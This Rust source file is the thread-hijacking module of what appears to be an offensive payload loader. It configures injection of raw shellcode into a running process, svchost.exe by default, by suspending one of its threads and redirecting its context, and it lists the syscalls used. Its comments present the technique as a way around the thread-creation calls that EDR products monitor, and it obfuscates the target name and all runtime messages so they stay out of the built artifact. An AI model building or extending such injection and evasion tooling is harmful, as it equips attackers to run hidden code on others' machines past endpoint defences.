//! Thread hijacking.
//!
//! Instead of creating a thread in the target process, the loader suspends a
//! thread that is already there, rewrites its instruction pointer so it resumes
//! inside the payload and lets it go. The target never gains a new thread, so
//! the `CreateRemoteThread`/`NtCreateThreadEx` corner of the kernel — the one
//! every EDR instruments — is never touched. See `README.md` for the full
//! write-up.

use serde::{Deserialize, Serialize};

use crate::engine::obfuscation::StringsConfig;
use crate::plan::schema::PayloadFormat;

use super::{Capability, Category, Stability, TechniqueDef};

/// Parameters for thread hijacking: which payload to run (the payload format
/// and export live in the payload's `build.payloads` entry) and which thread to
/// take over.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct Params {
    /// Name of the payload in `build.payloads` to run. Optional when the plan
    /// declares exactly one payload.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub payload: Option<String>,
    /// Process to hijack a thread of, matched case-insensitively against a
    /// running process's image name (its base name, so both `notepad.exe` and
    /// `C:\Windows\System32\notepad.exe` match). Ignored when `pid` is set.
    #[serde(default = "default_target")]
    pub target: String,
    /// Explicit process id to hijack. Wins over `target` when set, which is
    /// what a plan wants when several instances of the same image are running.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub pid: Option<u32>,
    /// Give the hijacked thread a fresh, private stack for the payload instead
    /// of letting it run on the target thread's live stack.
    ///
    /// `true` (the default) keeps the payload from clobbering the frames the
    /// target thread was suspended in. The price is that the thread no longer
    /// has a caller to return to: a payload that returns jumps to a null return
    /// address and takes the target down. `false` runs the payload on the
    /// target's own stack, where a cooperative payload can return into the
    /// suspended frame — and a greedy one corrupts the target.
    #[serde(default = "default_dedicated_stack")]
    pub dedicated_stack: bool,
    /// How long the loader waits for the target process to exit, in
    /// milliseconds.
    ///
    /// `0` (the default) does not wait: the thread is resumed and the loader
    /// walks on. See the README for the exit code reported in each case.
    #[serde(default)]
    pub wait_ms: u64,
}

impl Default for Params {
    /// Defaults to hijacking the first thread of an `svchost.exe`, on a
    /// dedicated stack, without waiting.
    ///
    /// The manual impl keeps `Params::default()` and the `serde` field default
    /// in step: a runtime step with no `params:` mapping gets the default
    /// struct, not the field-level defaults.
    fn default() -> Self {
        Self {
            payload: None,
            target: default_target(),
            pid: None,
            dedicated_stack: default_dedicated_stack(),
            wait_ms: 0,
        }
    }
}

/// The default hijack target: a process every Windows install has.
///
/// The value is an image name, not a path: the technique looks for a *running*
/// process, so a full path would only be compared by its base name anyway.
pub fn default_target() -> String {
    "svchost.exe".to_string()
}

/// Default of [`Params::dedicated_stack`].
pub fn default_dedicated_stack() -> bool {
    true
}

/// Static metadata for thread hijacking.
pub const DEF: TechniqueDef = TechniqueDef {
    name: "thread_hijacking",
    attck: &["T1055.003"],
    stability: Stability::Experimental,
    requires: &[Capability::WindowsX64, Capability::WindowsX86],
    conflicts: &[],
    category: Category::Execution,
    doc_path: "src/techniques/thread_hijacking/README.md",
    stub_fragment: include_str!("stub_fragment.rs"),
    params_example: "technique: thread_hijacking\nparams:\n  target: notepad.exe\n",
    readme: include_str!("README.md"),
    syscalls: &[
        "NtOpenProcess",
        "NtAllocateVirtualMemory",
        "NtWriteVirtualMemory",
        "NtProtectVirtualMemory",
        "NtSuspendThread",
        "NtGetContextThread",
        "NtSetContextThread",
        "NtResumeThread",
        "NtWaitForSingleObject",
        "NtClose",
    ],
    resolves_imports: false,
};

/// Runtime diagnostics the fragment can emit, as `(placeholder, plaintext)`
/// pairs.
///
/// `render_fragment_for` replaces each placeholder with code that rebuilds the
/// text at run time (using `strings`'s active strategy), so no diagnostic — and
/// in particular no target name — lands in the artifact's `.rdata`.
const MESSAGES: &[(&str, &str)] = &[
    ("$MSG_EMPTY$", "the payload is empty"),
    (
        "$MSG_SNAPSHOT_FAILED$",
        "could not take a process/thread snapshot",
    ),
    (
        "$MSG_NO_TARGET$",
        "no running process matches the configured hijack target",
    ),
    (
        "$MSG_OPEN_PROCESS_FAILED$",
        "could not open the target process",
    ),
    (
        "$MSG_NO_THREAD$",
        "the target process has no thread to hijack",
    ),
    (
        "$MSG_OPEN_THREAD_FAILED$",
        "could not open a thread of the target process",
    ),
    (
        "$MSG_ALLOC_FAILED$",
        "could not allocate memory in the target process",
    ),
    (
        "$MSG_WRITE_FAILED$",
        "could not write the payload into the target process",
    ),
    (
        "$MSG_WRITE_SHORT$",
        "the target process accepted only part of the payload",
    ),
    (
        "$MSG_PROTECT_FAILED$",
        "could not make the payload executable in the target process",
    ),
    (
        "$MSG_STACK_FAILED$",
        "could not give the hijacked thread a private stack",
    ),
    (
        "$MSG_SUSPEND_FAILED$",
        "could not suspend the target thread",
    ),
    (
        "$MSG_GET_CONTEXT_FAILED$",
        "could not read the target thread's context",
    ),
    (
        "$MSG_SET_CONTEXT_FAILED$",
        "could not redirect the target thread",
    ),
    ("$MSG_RESUME_FAILED$", "could not resume the target thread"),
    ("$MSG_WAIT_FAILED$", "could not wait for the target process"),
    (
        "$MSG_EXIT_CODE_FAILED$",
        "could not read the target's exit code",
    ),
];

impl Params {
    /// Renders the thread-hijacking stub fragment for these parameters.
    ///
    /// The target name and every runtime message are rebuilt from `strings`'s
    /// obfuscated bytes, so none of them appears in the artifact in cleartext.
    /// The payload-format guard is resolved here too: the technique runs raw
    /// shellcode, so a `pe`/`dll`/`dotnet` payload gets a fragment that fails
    /// with a clear message instead of executing a file header. (A build-time
    /// rule for that combination lives in `plan::validate`; the guard covers a
    /// plan that slips through.)
    pub fn render_fragment_for(
        &self,
        strings: &StringsConfig,
        format: PayloadFormat,
        _export: Option<&str>,
    ) -> String {
        let target_def = strings
            .obfuscate(&self.target)
            .render_stub_expr("thread_hijacking_target");
        let pid_def = match self.pid {
            Some(pid) => format!("Some({pid}u32)"),
            None => "None::<u32>".to_string(),
        };
        let unsupported_format = format!(
            "the thread_hijacking technique runs raw shellcode payloads only (this payload's format is '{}')",
            format.label()
        );
        // `NtWaitForSingleObject` takes a `u32` timeout; `u32::MAX` is an
        // infinite wait in both modes of the syscall layer.
        let wait_ms = self.wait_ms.min(u64::from(u32::MAX)) as u32;

        let mut rendered = DEF.stub_fragment.to_string();
        for (index, (placeholder, text)) in MESSAGES.iter().enumerate() {
            rendered = rendered.replace(
                placeholder,
                &strings
                    .obfuscate(text)
                    .render_stub_expr(&format!("thread_hijacking_msg_{index}")),
            );
        }
        rendered
            .replace("$TARGET_DEF$", &target_def)
            .replace("$PID_DEF$", &pid_def)
            .replace("$WAIT_MS$", &format!("{wait_ms}u32"))
            .replace(
                "$DEDICATED_STACK$",
                if self.dedicated_stack {
                    "true"
                } else {
                    "false"
                },
            )
            .replace(
                "$SUPPORTED_FORMAT$",
                if format == PayloadFormat::Shellcode {
                    "true"
                } else {
                    "false"
                },
            )
            .replace(
                "$MSG_UNSUPPORTED_FORMAT$",
                &strings
                    .obfuscate(&unsupported_format)
                    .render_stub_expr("thread_hijacking_unsupported"),
            )
    }
}

#[cfg(test)]
mod tests;
